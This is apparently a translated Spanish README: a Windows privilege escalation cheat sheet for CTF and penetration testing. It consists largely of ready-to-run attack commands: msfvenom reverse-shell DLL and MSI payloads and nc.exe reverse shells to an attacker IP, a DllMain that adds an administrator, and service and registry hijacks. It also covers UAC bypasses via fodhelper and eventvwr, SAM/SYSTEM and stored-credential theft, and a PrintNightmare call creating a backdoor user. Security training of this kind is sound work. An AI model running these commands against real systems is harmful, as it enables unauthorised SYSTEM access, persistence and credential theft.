# 🪟 Elevación de privilegios en Windows: guía rápida completa

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)


> **Precisiones de compatibilidad:** Se conservan los comandos, filtros de Process Monitor y versiones del original. Una ruta sin comillas o un permiso de escritura solo permite elevar privilegios si se cumplen el contexto de ejecución, los permisos y el modo de activación necesarios. `Get-ModifiableService` pertenece a herramientas como PowerUp, no es un cmdlet integrado. La búsqueda de DLL depende del proceso y de las políticas de carga. Las copias directas de SAM/SYSTEM pueden fallar porque los archivos están bloqueados; los privilegios de copia de seguridad no eliminan todas esas restricciones. Los ataques Potato y las evasiones UAC dependen de la compilación, parches y configuración; los rótulos de versiones no garantizan compatibilidad ([JuicyPotato](https://github.com/ohpe/juicy-potato), [Microsoft UAC](https://learn.microsoft.com/en-us/windows-server/security/user-account-control/user-account-control-overview)). La tabla de exploits mezcla boletines MS, CVE, fallos remotos y locales: «Todas» no significa que cualquier versión actual sea vulnerable. Que Spooler esté activo tampoco confirma PrintNightmare.


```
  ██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗███████╗
  ██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║██╔════╝
  ██║ █╗ ██║██║██╔██╗ ██║██║  ██║██║   ██║██║ █╗ ██║███████╗
  ██║███╗██║██║██║╚██╗██║██║  ██║██║   ██║██║███╗██║╚════██║
  ╚███╔███╔╝██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝███████║
   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Windows-PrivEsc-blue?style=for-the-badge" alt="Windows PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/SYSTEM-Access-red?style=for-the-badge" alt="SYSTEM">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Guía completa para elevar privilegios en sistemas Windows</b>
</p>

---

## 📋 Índice

- [Enumeración](#enumeración)
- [Explotación de servicios](#explotación-de-servicios)
- [Rutas de servicio sin comillas](#rutas-de-servicio-sin-comillas)
- [Secuestro de DLL (DLL hijacking)](#secuestro-de-dll-dll-hijacking)
- [AlwaysInstallElevated](#alwaysinstallelevated)
- [Credenciales almacenadas](#credenciales-almacenadas)
- [Manipulación de tokens](#manipulación-de-tokens)
- [Ataques Potato](#ataques-potato)
- [Explotación del Registro](#explotación-del-registro)
- [Tareas programadas](#tareas-programadas)
- [Evasión de UAC](#evasión-de-uac)
- [Exploits del kernel](#exploits-del-kernel)
- [Referencia rápida](#referencia-rápida)

---

<a id="enumeración"></a>

## 🔍 Enumeración

### Información del sistema

```cmd
# Información del sistema
systeminfo
hostname

# Versión del sistema operativo
ver
wmic os get caption,version,buildnumber

# Arquitectura
echo %PROCESSOR_ARCHITECTURE%

# Parches y correcciones
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Información de usuarios

```cmd
# Usuario actual
whoami
whoami /all
whoami /priv
whoami /groups

# Todos los usuarios
net user
net localgroup administrators

# Detalles del usuario
net user username

# Privilegios actuales
whoami /priv
```

### Información de red

```cmd
# Configuración IP
ipconfig /all

# Rutas
route print

# Puertos abiertos
netstat -ano
netstat -an | findstr LISTENING

# Tabla ARP
arp -a

# Caché DNS
ipconfig /displaydns
```

### Procesos y servicios

```cmd
# Procesos en ejecución
tasklist
tasklist /svc
wmic process list full

# Servicios
sc query
net start
wmic service list brief

# Controladores
driverquery
```

### Enumeración con PowerShell

```powershell
# Información del sistema
Get-ComputerInfo

# Usuarios
Get-LocalUser
Get-LocalGroupMember Administrators

# Servicios
Get-Service

# Procesos
Get-Process

# Software instalado
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, InstallDate
```

---

<a id="explotación-de-servicios"></a>

## ⚙️ Explotación de servicios

### Encontrar servicios vulnerables

```cmd
# Listar servicios
sc query state= all

# Permisos de servicios
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *

# Comprobar un servicio específico
sc qc servicename
```

### Permisos de servicio débiles

```cmd
# Si se puede modificar la configuración del servicio:
sc config servicename binpath= "C:\Users\Public\shell.exe"
sc config servicename binpath= "net localgroup administrators user /add"
sc stop servicename
sc start servicename
```

### Permisos débiles sobre el binario del servicio

```cmd
# Comprobar los permisos del binario
icacls "C:\Program Files\Service\binary.exe"

# Si se puede escribir, reemplazarlo por un binario malicioso
copy shell.exe "C:\Program Files\Service\binary.exe"
sc stop servicename
sc start servicename
```

### Comprobación de servicios con PowerShell

```powershell
# Obtener información de servicios
Get-WmiObject win32_service | Select-Object Name, StartName, PathName

# Buscar servicios modificables
Get-ModifiableService
```

---

<a id="rutas-de-servicio-sin-comillas"></a>

## 📂 Rutas de servicio sin comillas

### Buscar rutas sin comillas

```cmd
# Buscar rutas de servicio sin comillas
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject win32_service | Select-Object Name,PathName | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}
```

### Explotar una ruta sin comillas

```
# Si la ruta es: C:\Program Files\Vulnerable Service\service.exe
# Windows busca:
# 1. C:\Program.exe
# 2. C:\Program Files\Vulnerable.exe
# 3. C:\Program Files\Vulnerable Service\service.exe

# Colocar el ejecutable malicioso:
copy shell.exe "C:\Program Files\Vulnerable.exe"

# Reiniciar el servicio
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

---

<a id="secuestro-de-dll-dll-hijacking"></a>

## 📚 Secuestro de DLL (DLL hijacking)

### Buscar DLL ausentes

```cmd
# Usar Process Monitor para encontrar DLL ausentes
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Ubicaciones habituales que se comprueban:
# 1. Directorio de la aplicación
# 2. C:\Windows\System32
# 3. C:\Windows
# 4. Directorio actual
# 5. Directorios de PATH
```

### Crear una DLL maliciosa

```c
// Payload de msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll

// O compilar una DLL personalizada:
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators user /add");
    }
    return TRUE;
}
```

### Explotación

```cmd
# Copiar la DLL a un directorio con permiso de escritura dentro de la ruta de búsqueda
copy evil.dll "C:\Program Files\App\missing.dll"

# Hacer que la aplicación cargue la DLL
# Reiniciar el servicio o la aplicación
```

---

<a id="alwaysinstallelevated"></a>

## 📦 AlwaysInstallElevated

### Comprobar la vulnerabilidad

```cmd
# Ambos valores deben ser 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Explotación

```bash
# Generar un MSI malicioso
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# Transferir y ejecutar
msiexec /quiet /qn /i evil.msi
```

---

<a id="credenciales-almacenadas"></a>

## 🔑 Credenciales almacenadas

### Administrador de credenciales

```cmd
# Listar las credenciales almacenadas
cmdkey /list

# Usar las credenciales guardadas
runas /savecred /user:Administrator cmd.exe
```

### SAM y SYSTEM

```cmd
# Copiar los archivos SAM (se necesita SYSTEM)
copy C:\Windows\System32\config\SAM C:\Users\Public\SAM
copy C:\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM

# Desde instantáneas de volumen
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
```

### Credenciales del Registro

```cmd
# Contraseñas de inicio de sesión automático
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# Contraseñas VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Sesiones PuTTY
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### Archivos con contraseñas

```cmd
# Buscar contraseñas
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*

# Archivos de instalación desatendida
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep.inf
C:\Windows\System32\sysprep\sysprep.xml

# Historial de PowerShell
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Configuración de IIS
type C:\inetpub\wwwroot\web.config
```

### Contraseñas WiFi

```cmd
# Listar los perfiles
netsh wlan show profiles

# Obtener la contraseña
netsh wlan show profile name="SSID" key=clear
```

---

<a id="manipulación-de-tokens"></a>

## 🎭 Manipulación de tokens

### Comprobar privilegios

```cmd
whoami /priv

# Privilegios peligrosos:
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

### SeImpersonatePrivilege

```cmd
# Si SeImpersonatePrivilege está habilitado:
# Usar ataques Potato (JuicyPotato, PrintSpoofer, etc.)

# PrintSpoofer
PrintSpoofer.exe -i -c "cmd"
PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd"

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### SeBackupPrivilege

```cmd
# Puede leer cualquier archivo (descripción del original)
# Copiar SAM y SYSTEM
robocopy /b C:\Windows\System32\config C:\Users\Public SAM SYSTEM
```

### SeRestorePrivilege

```cmd
# Puede escribir en cualquier ubicación (descripción del original)
# Reemplazar archivos del sistema
```

---

<a id="ataques-potato"></a>

## 🥔 Ataques Potato

### JuicyPotato (Windows Server 2016/2019)

```cmd
# Requiere SeImpersonatePrivilege o SeAssignPrimaryToken
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators user /add" -t *
```

### PrintSpoofer (Windows 10/Server 2016+)

```cmd
# Requiere SeImpersonatePrivilege
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe 10.10.10.10 4444 -e cmd"
```

### RoguePotato

```cmd
RoguePotato.exe -r 10.10.10.10 -e "cmd /c whoami > C:\Users\Public\out.txt" -l 9999
```

### GodPotato (Windows 10/11/Server 2019-2022)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.10.10 4444"
```

---

<a id="explotación-del-registro"></a>

## 📝 Explotación del Registro

### AutoRuns

```cmd
# Comprobar ubicaciones de inicio automático
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Si se puede escribir, añadir una entrada maliciosa
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\Public\shell.exe"
```

### Claves del Registro de servicios

```cmd
# Comprobar los permisos del Registro del servicio
accesschk.exe -kvuqws "Everyone" HKLM\System\CurrentControlSet\Services

# Modificar ImagePath del servicio
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vulnerable" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\shell.exe" /f
```

---

<a id="tareas-programadas"></a>

## ⏰ Tareas programadas

### Listar las tareas programadas

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# PowerShell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```

### Buscar scripts de tareas con permiso de escritura

```cmd
# Si la tarea ejecuta un script que se puede modificar:
icacls "C:\Scripts\backup.bat"

# Añadir un comando malicioso
echo net localgroup administrators user /add >> C:\Scripts\backup.bat
```

### Crear una tarea maliciosa

```cmd
# Si se dispone de permiso para crear tareas
schtasks /create /tn "Evil" /tr "C:\Users\Public\shell.exe" /sc onlogon /ru SYSTEM
```

---

<a id="evasión-de-uac"></a>

## 🛡️ Evasión de UAC

### Comprobar el nivel de UAC

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

### Evasión mediante Fodhelper

```cmd
# Funciona en Windows 10 (afirmación del original)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe

# Limpiar los cambios
reg delete HKCU\Software\Classes\ms-settings /f
```

### Evasión mediante EventViewer

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
```

---

<a id="exploits-del-kernel"></a>

## 💣 Exploits del kernel

### Comprobar la información del sistema

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Exploits habituales

| CVE | Versión de Windows | Nombre |
|-----|-----------------|------|
| MS08-067 | XP/2003 | NetAPI |
| MS16-032 | 7/8/10/2012 | Secondary Logon |
| MS17-010 | Todas | **EternalBlue** |
| CVE-2020-0796 | 10/Server 2019 | **SMBGhost** |
| CVE-2021-1732 | 10/Server | Win32k |
| CVE-2021-34527 | Todas | **PrintNightmare** |

### PrintNightmare (CVE-2021-34527)

```cmd
# Comprobar si es vulnerable
Get-Service Spooler

# Explotación (PowerShell)
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "password123!" -DriverName "Xerox"
```

---

<a id="referencia-rápida"></a>

## 📊 Referencia rápida

### Enumeración en una línea

```cmd
# Información rápida
whoami /all & systeminfo & net user

# Comprobar privilegios
whoami /priv

# Servicios
wmic service get name,pathname | findstr /i /v "c:\windows"

# Tareas programadas
schtasks /query /fo LIST /v | findstr /i "taskname\|run"
```

### Herramientas automatizadas

| Herramienta | Descripción |
|------|-------------|
| **WinPEAS** | Enumeración exhaustiva |
| **PowerUp** | Elevación de privilegios con PowerShell |
| **Seatbelt** | Comprobaciones de seguridad |
| **SharpUp** | Comprobaciones de elevación de privilegios en C# |

### Lista de comprobación de oportunidades rápidas

- [ ] `whoami /priv` - Comprobar SeImpersonate
- [ ] Rutas de servicio sin comillas
- [ ] Binarios de servicios con permiso de escritura
- [ ] AlwaysInstallElevated
- [ ] Credenciales almacenadas (cmdkey /list)
- [ ] Contraseñas de inicio automático en el Registro
- [ ] Permisos de servicio débiles
- [ ] Scripts de tareas programadas
- [ ] Versión del kernel: ¿PrintNightmare?

---

## 📚 Recursos

- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Guías rápidas relacionadas
- WinPEAS (guía citada pero ausente en el original)
- [Elevación de privilegios en Linux](../../Linux-PrivEsc/translations/README.es.md)

---

<p align="center">
  <b>🪟 ¡Obtén SYSTEM!</b><br>
  <i>Domina la elevación de privilegios en Windows</i>
</p>
